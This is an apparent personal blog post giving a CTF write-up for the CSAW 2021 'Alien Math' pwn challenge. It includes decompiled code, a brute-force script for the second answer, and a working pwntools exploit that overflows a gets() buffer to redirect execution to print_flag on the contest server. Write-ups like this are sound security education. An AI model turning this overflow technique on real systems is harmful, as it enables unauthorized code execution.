@@ -1,0 +1,151 @@
+<!doctype html><html><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title> rdk31's blog </title><link href=https://rdk31.com/fonts.css rel=stylesheet><script async data-goatcounter=https://rdk31.goatcounter.com/count src=https://rdk31.com/js/count.js></script><noscript><img src="https://rdk31.goatcounter.com//count?p=/posts/csawctf2021-alien-math/&t=CSAW CTF Qualification Round 2021 - Alien Math"></noscript><link title="rdk31's blog" href=https://rdk31.com/atom.xml rel=alternate type=application/atom+xml><link href=https://rdk31.com/theme/light.css rel=stylesheet><link media="(prefers-color-scheme: dark)" href=https://rdk31.com/theme/dark.css rel=stylesheet><link href=https://rdk31.com/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://rdk31.com>rdk31's blog</a></div><nav><a style="margin-left: 0.7em" href=/posts>/posts</a><a style="margin-left: 0.7em" href=/tags>/tags</a><a style="margin-left: 0.7em" href=/about>/about</a></nav></header><main><article><div class=title><div class=page-header>CSAW CTF Qualification Round 2021 - Alien Math<span style="font-size: 1.6em" class=primary-color>.</span></div><div class=meta>Posted on 2021-09-14</div></div><section class=body><h1 id=alien-math>Alien Math</h1><h2 id=task-description>Task description</h2><p>Brush off your Flirbgarple textbooks!<p><a href=files/alien_math>alien_math</a><h2 id=solution>Solution</h2><p>The application asks 3 questions and while the first two are implemented correctly the 3rd uses <code>gets</code>. So, we have to correctly answer to the first two questions and then just do a simple stack buffer overflow. In addition, there's a function called print_flag which prints the flag.<pre class=language-c data-lang=c style=background-color:#2b303b;color:#c0c5ce;><code class=language-c data-lang=c><span>undefined8 </span><span style=color:#8fa1b3;>main</span><span>(</span><span style=color:#b48ead;>void</span><span>)
+</span><span>{
+</span><span>  </span><span style=color:#b48ead;>int</span><span> iVar1;
+</span><span>  undefined local_38 [</span><span style=color:#d08770;>36</span><span>];
+</span><span>  </span><span style=color:#b48ead;>int</span><span> local_14;
+</span><span>  </span><span style=color:#b48ead;>long</span><span> local_10;
+</span><span>
+</span><span>  </span><span style=color:#96b5b4;>puts</span><span>("</span><span style=color:#96b5b4;>\n</span><span style=color:#a3be8c;>==== Flirbgarple Math Pop Quiz ====</span><span>");
+</span><span>  </span><span style=color:#96b5b4;>puts</span><span>("</span><span style=color:#a3be8c;>=== Make an A to receive a flag! ===</span><span style=color:#96b5b4;>\n</span><span>");
+</span><span>  </span><span style=color:#96b5b4;>puts</span><span>("</span><span style=color:#a3be8c;>What is the square root of zopnol?</span><span>");
+</span><span>  </span><span style=color:#96b5b4;>fflush</span><span>(stdout);
+</span><span>  </span><span style=color:#bf616a;>__isoc99_scanf</span><span>(&DAT_0040220b,&local_14);
+</span><span>  iVar1 = </span><span style=color:#96b5b4;>rand</span><span>();
+</span><span>  local_10 = (</span><span style=color:#b48ead;>long</span><span>)iVar1;
+</span><span>  </span><span style=color:#b48ead;>if </span><span>(local_10 == (</span><span style=color:#b48ead;>long</span><span>)local_14) {
+</span><span>    </span><span style=color:#96b5b4;>puts</span><span>("</span><span style=color:#a3be8c;>Correct!</span><span style=color:#96b5b4;>\n</span><span>");
+</span><span>    </span><span style=color:#96b5b4;>fflush</span><span>(stdout);
+</span><span>    </span><span style=color:#96b5b4;>getchar</span><span>();
+</span><span>    </span><span style=color:#96b5b4;>puts</span><span>("</span><span style=color:#a3be8c;>How many tewgrunbs are in a qorbnorbf?</span><span>");
+</span><span>    </span><span style=color:#96b5b4;>fflush</span><span>(stdout);
+</span><span>    </span><span style=color:#bf616a;>__isoc99_scanf</span><span>(&DAT_00402247,local_38);
+</span><span>    </span><span style=color:#bf616a;>second_question</span><span>(local_38);
+</span><span>  }
+</span><span>  </span><span style=color:#b48ead;>else </span><span>{
+</span><span>    </span><span style=color:#96b5b4;>puts</span><span>("</span><span style=color:#a3be8c;>Incorrect. That</span><span style=color:#96b5b4;>\'</span><span style=color:#a3be8c;>s an F for you!</span><span>");
+</span><span>  }
+</span><span>  </span><span style=color:#b48ead;>return </span><span style=color:#d08770;>0</span><span>;
+</span><span>}
+</span></code></pre><p>The first question does <code>rand()</code> without setting the seed and the default seed value is 0 (not always, it depends on the implementation). So it's a constant.<pre class=language-c data-lang=c style=background-color:#2b303b;color:#c0c5ce;><code class=language-c data-lang=c><span style=color:#b48ead;>void </span><span style=color:#8fa1b3;>second_question</span><span>(</span><span style=color:#b48ead;>char </span><span>*</span><span style=color:#bf616a;>param_1</span><span>)
+</span><span>{
+</span><span>  </span><span style=color:#b48ead;>char</span><span> cVar1;
+</span><span>  </span><span style=color:#b48ead;>int</span><span> iVar2;
+</span><span>  size_t __n;
+</span><span>  ulong uVar3;
+</span><span>  undefined8 local_38;
+</span><span>  undefined8 local_30;
+</span><span>  undefined8 local_28;
+</span><span>  </span><span style=color:#b48ead;>int</span><span> local_1c;
+</span><span>
+</span><span>  local_1c = </span><span style=color:#d08770;>0</span><span>;
+</span><span>  </span><span style=color:#b48ead;>while</span><span>( </span><span style=color:#d08770;>true </span><span>) {
+</span><span>    uVar3 = </span><span style=color:#bf616a;>SEXT48</span><span>(local_1c);
+</span><span>    __n = </span><span style=color:#96b5b4;>strlen</span><span>(param_1);
+</span><span>    </span><span style=color:#b48ead;>if </span><span>(__n - </span><span style=color:#d08770;>1 </span><span><= uVar3) {
+</span><span>      local_38 = </span><span style=color:#d08770;>3762247539570849591</span><span>;
+</span><span>      local_30 = </span><span style=color:#d08770;>3689067348388623672</span><span>;
+</span><span>      local_28 = </span><span style=color:#d08770;>58489707246130</span><span>;
+</span><span>      __n = </span><span style=color:#96b5b4;>strlen</span><span>((</span><span style=color:#b48ead;>char </span><span>*)&local_38);
+</span><span>      iVar2 = </span><span style=color:#96b5b4;>strncmp</span><span>((</span><span style=color:#b48ead;>char </span><span>*)&local_38,param_1,__n);
+</span><span>      </span><span style=color:#b48ead;>if </span><span>(iVar2 == </span><span style=color:#d08770;>0</span><span>) {
+</span><span>        </span><span style=color:#96b5b4;>puts</span><span>("</span><span style=color:#a3be8c;>Genius! One question left...</span><span style=color:#96b5b4;>\n</span><span>");
+</span><span>        </span><span style=color:#bf616a;>final_question</span><span>();
+</span><span>        </span><span style=color:#96b5b4;>puts</span><span>("</span><span style=color:#a3be8c;>Not quite. Double check your calculations.</span><span style=color:#96b5b4;>\n</span><span style=color:#a3be8c;>You made a B. So close!</span><span style=color:#96b5b4;>\n</span><span>");
+</span><span>      }
+</span><span>      </span><span style=color:#b48ead;>else </span><span>{
+</span><span>        </span><span style=color:#96b5b4;>puts</span><span>("</span><span style=color:#a3be8c;>You get a C. No flag this time.</span><span style=color:#96b5b4;>\n</span><span>");
+</span><span>      }
+</span><span>      </span><span style=color:#b48ead;>return</span><span>;
+</span><span>    }
+</span><span>    </span><span style=color:#b48ead;>if </span><span>((param_1[local_1c] < '</span><span style=color:#a3be8c;>0</span><span>') || ('</span><span style=color:#a3be8c;>9</span><span>' < param_1[local_1c])) </span><span style=color:#b48ead;>break</span><span>;
+</span><span>    cVar1 = param_1[(</span><span style=color:#b48ead;>long</span><span>)local_1c + </span><span style=color:#d08770;>1</span><span>];
+</span><span>    iVar2 = second_question_function
+</span><span>                      ((ulong)(uint)(</span><span style=color:#b48ead;>int</span><span>)param_1[local_1c],
+</span><span>                       (ulong)(uint)(param_1[local_1c] + local_1c),
+</span><span>                       (ulong)(uint)(param_1[local_1c] + local_1c));
+</span><span>    iVar2 = (</span><span style=color:#b48ead;>int</span><span>)cVar1 + -</span><span style=color:#d08770;>0x30 </span><span>+ iVar2;
+</span><span>    param_1[(</span><span style=color:#b48ead;>long</span><span>)local_1c + </span><span style=color:#d08770;>1</span><span>] = (</span><span style=color:#b48ead;>char</span><span>)iVar2 + (</span><span style=color:#b48ead;>char</span><span>)(iVar2 / </span><span style=color:#d08770;>10</span><span>) * -</span><span style=color:#d08770;>10 </span><span>+ '</span><span style=color:#a3be8c;>0</span><span>';
+</span><span>    local_1c = local_1c + </span><span style=color:#d08770;>1</span><span>;
+</span><span>  }
+</span><span>  </span><span style=color:#96b5b4;>puts</span><span>("</span><span style=color:#a3be8c;>Xolplsmorp! Invalid input!</span><span style=color:#96b5b4;>\n</span><span>");
+</span><span>  </span><span style=color:#96b5b4;>puts</span><span>("</span><span style=color:#a3be8c;>You get a C. No flag this time.</span><span style=color:#96b5b4;>\n</span><span>");
+</span><span>  </span><span style=color:#b48ead;>return</span><span>;
+</span><span>}
+</span><span>
+</span><span>ulong </span><span style=color:#8fa1b3;>second_question_function</span><span>(</span><span style=color:#b48ead;>int </span><span style=color:#bf616a;>param_1</span><span>,</span><span style=color:#b48ead;>int </span><span style=color:#bf616a;>param_2</span><span>)
+</span><span>{
+</span><span>  </span><span style=color:#b48ead;>return </span><span>(ulong)((uint)((param_1 + -</span><span style=color:#d08770;>0x30</span><span>) * </span><span style=color:#d08770;>0x30 </span><span>+ (param_2 + -</span><span style=color:#d08770;>0x30</span><span>) * </span><span style=color:#d08770;>0xb </span><span>+ -</span><span style=color:#d08770;>4</span><span>) % </span><span style=color:#d08770;>10</span><span>);
+</span><span>}
+</span></code></pre><p>The second question takes a line, does some operations on it and compares with the hardcoded value. The decompiled code is a bit of a bad quality but it could be summarized to this pseudocode:<pre class=language-py3 data-lang=py3 style=background-color:#2b303b;color:#c0c5ce;><code class=language-py3 data-lang=py3><span>input_str = "</span><span style=color:#a3be8c;>12345</span><span>" </span><span style=color:#65737e;># only numbers are allowed
+</span><span style=color:#b48ead;>for </span><span>i </span><span style=color:#b48ead;>in </span><span style=color:#96b5b4;>range</span><span>(</span><span style=color:#96b5b4;>len</span><span>(input_str) - </span><span style=color:#d08770;>1</span><span>):
+</span><span>    input_str[i + </span><span style=color:#d08770;>1</span><span>] = </span><span style=color:#bf616a;>do_something</span><span>(input_str[i], input_str[i + </span><span style=color:#d08770;>1</span><span>])
+</span><span>
+</span><span style=color:#b48ead;>if </span><span>input_str == "</span><span style=color:#a3be8c;>7759406485255323229225</span><span>":
+</span><span>    </span><span style=color:#bf616a;>final_question</span><span>()
+</span></code></pre><p>Which means that we can bruteforce it easily. A thing to note is that the first letter has to be 7 because it can't be modified (modifications start from index 1).<pre class=language-py3 data-lang=py3 style=background-color:#2b303b;color:#c0c5ce;><code class=language-py3 data-lang=py3><span style=color:#b48ead;>from </span><span>string </span><span style=color:#b48ead;>import </span><span>digits
+</span><span>
+</span><span>
+</span><span style=color:#b48ead;>def </span><span style=color:#8fa1b3;>second_func</span><span>(</span><span style=color:#bf616a;>a</span><span>, </span><span style=color:#bf616a;>b</span><span>):
+</span><span>    </span><span style=color:#b48ead;>return </span><span>((a - </span><span style=color:#d08770;>0x30</span><span>) * </span><span style=color:#d08770;>0x30 </span><span>+ (b - </span><span style=color:#d08770;>0x30</span><span>) * </span><span style=color:#d08770;>0xB </span><span>- </span><span style=color:#d08770;>4</span><span>) % </span><span style=color:#d08770;>10
+</span><span>
+</span><span>
+</span><span style=color:#b48ead;>def </span><span style=color:#8fa1b3;>encrypt</span><span>(</span><span style=color:#bf616a;>input_str</span><span>):
+</span><span>    input_str = [</span><span style=color:#96b5b4;>ord</span><span>(c) </span><span style=color:#b48ead;>for </span><span>c </span><span style=color:#b48ead;>in </span><span>input_str]
+</span><span>
+</span><span>    </span><span style=color:#b48ead;>for </span><span>i </span><span style=color:#b48ead;>in </span><span style=color:#96b5b4;>range</span><span>(</span><span style=color:#96b5b4;>len</span><span>(input_str) - </span><span style=color:#d08770;>1</span><span>):
+</span><span>        c1 = input_str[i + </span><span style=color:#d08770;>1</span><span>]
+</span><span>        c2 = </span><span style=color:#bf616a;>second_func</span><span>(input_str[i], input_str[i] + i)
+</span><span>
+</span><span>        c3 = c1 - </span><span style=color:#d08770;>0x30 </span><span>+ c2
+</span><span>
+</span><span>        input_str[i + </span><span style=color:#d08770;>1</span><span>] = c3 - (c3 // </span><span style=color:#d08770;>10</span><span>) * </span><span style=color:#d08770;>10 </span><span>+ </span><span style=color:#96b5b4;>ord</span><span>("</span><span style=color:#a3be8c;>0</span><span>")
+</span><span>
+</span><span>    input_str = [</span><span style=color:#96b5b4;>chr</span><span>(i) </span><span style=color:#b48ead;>for </span><span>i </span><span style=color:#b48ead;>in </span><span>input_str]
+</span><span>
+</span><span>    </span><span style=color:#b48ead;>return </span><span>"".</span><span style=color:#bf616a;>join</span><span>(input_str)
+</span><span>
+</span><span>
+</span><span>solutions = ["</span><span style=color:#a3be8c;>7</span><span>"]
+</span><span>encrypted = "</span><span style=color:#a3be8c;>7759406485255323229225</span><span>"
+</span><span>
+</span><span style=color:#b48ead;>for </span><span>i </span><span style=color:#b48ead;>in </span><span style=color:#96b5b4;>range</span><span>(</span><span style=color:#96b5b4;>len</span><span>(encrypted) - </span><span style=color:#d08770;>1</span><span>):
+</span><span>    new_solutions = []
+</span><span>    </span><span style=color:#b48ead;>for </span><span>p </span><span style=color:#b48ead;>in </span><span>solutions:
+</span><span>        </span><span style=color:#b48ead;>for </span><span>s </span><span style=color:#b48ead;>in </span><span>digits:
+</span><span>            o = </span><span style=color:#bf616a;>encrypt</span><span>(p + s)
+</span><span>            </span><span style=color:#b48ead;>if </span><span>encrypted.</span><span style=color:#bf616a;>startswith</span><span>(o):
+</span><span>                new_solutions.</span><span style=color:#bf616a;>append</span><span>(p + s)
+</span><span>
+</span><span>    solutions = new_solutions
+</span><span>
+</span><span style=color:#96b5b4;>print</span><span>(solutions)
+</span></code></pre><pre class=language-c data-lang=c style=background-color:#2b303b;color:#c0c5ce;><code class=language-c data-lang=c><span style=color:#b48ead;>void </span><span style=color:#8fa1b3;>final_question</span><span>(</span><span style=color:#b48ead;>void</span><span>)
+</span><span>{
+</span><span>  undefined8 local_18;
+</span><span>  undefined8 local_10;
+</span><span>
+</span><span>  local_18 = </span><span style=color:#d08770;>0</span><span>;
+</span><span>  local_10 = </span><span style=color:#d08770;>0</span><span>;
+</span><span>  </span><span style=color:#96b5b4;>puts</span><span>(
+</span><span>      "</span><span style=color:#a3be8c;>How long does it take for a toblob of energy to be transferred between two quantum entangledsalwzoblrs?</span><span>"
+</span><span>      );
+</span><span>  </span><span style=color:#96b5b4;>fflush</span><span>(stdout);
+</span><span>  </span><span style=color:#96b5b4;>getchar</span><span>();
+</span><span>  </span><span style=color:#96b5b4;>gets</span><span>((</span><span style=color:#b48ead;>char </span><span>*)&local_18);
+</span><span>  </span><span style=color:#b48ead;>return</span><span>;
+</span><span>}
+</span></code></pre><p>The final exploit.<pre class=language-py3 data-lang=py3 style=background-color:#2b303b;color:#c0c5ce;><code class=language-py3 data-lang=py3><span style=color:#b48ead;>from </span><span>pwn </span><span style=color:#b48ead;>import </span><span style=color:#d08770;>*
+</span><span>
+</span><span style=color:#65737e;># io = process("./alien_math")
+</span><span>io = </span><span style=color:#bf616a;>remote</span><span>("</span><span style=color:#a3be8c;>pwn.chal.csaw.io</span><span>", </span><span style=color:#d08770;>5004</span><span>)
+</span><span>
+</span><span>io.</span><span style=color:#bf616a;>sendline</span><span>("</span><span style=color:#a3be8c;>1804289383</span><span>".</span><span style=color:#bf616a;>encode</span><span>())  </span><span style=color:#65737e;># first question
+</span><span>
+</span><span>io.</span><span style=color:#bf616a;>sendline</span><span>("</span><span style=color:#a3be8c;>7856445899213065428791</span><span>".</span><span style=color:#bf616a;>encode</span><span>())  </span><span style=color:#65737e;># second question
+</span><span>
+</span><span>payload = </span><span style=color:#b48ead;>b</span><span>"</span><span style=color:#a3be8c;>A</span><span>" * </span><span style=color:#bf616a;>cyclic_find</span><span>(</span><span style=color:#d08770;>0x61616167</span><span>)
+</span><span>payload += </span><span style=color:#bf616a;>p64</span><span>(</span><span style=color:#d08770;>0x004014FB</span><span>)  </span><span style=color:#65737e;># print_flag function address
+</span><span>io.</span><span style=color:#bf616a;>sendline</span><span>(payload)
+</span><span>
+</span><span>io.</span><span style=color:#bf616a;>interactive</span><span>()
+</span></code></pre><p>The flag: <code>flag{w3fL15n1Rx!_y0u_r34lLy_4R3_@_fL1rBg@rpL3_m4573R!}</code></section></article></main><div class=post-footer><div class=post-tags>tags: <a href=https://rdk31.com/tags/ctf/>#ctf</a></div><div class=post-nav><a class=previous href=https://rdk31.com/posts/csawctf2021-a-different-type-of-serial-key/>‹ CSAW CTF Qualification Round 2021 - A Different Type of Serial Key</a></div></div></div>
